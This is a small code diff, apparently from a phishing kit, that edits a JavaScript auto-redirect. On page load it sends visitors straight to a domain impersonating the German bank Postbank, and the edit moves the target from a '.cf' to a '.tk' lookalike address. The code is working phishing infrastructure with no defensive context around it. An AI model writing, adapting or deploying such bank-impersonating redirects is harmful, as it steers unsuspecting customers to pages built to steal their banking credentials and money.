@@ -17,7 +17,7 @@
 
  function Redirect() 
     {  
-        window.location="https://meinepostbank.cf/"; 
+        window.location="https://meinepostbank.tk"; 
     } 
     document.write(""); 
     setTimeout('Redirect()', 0);   
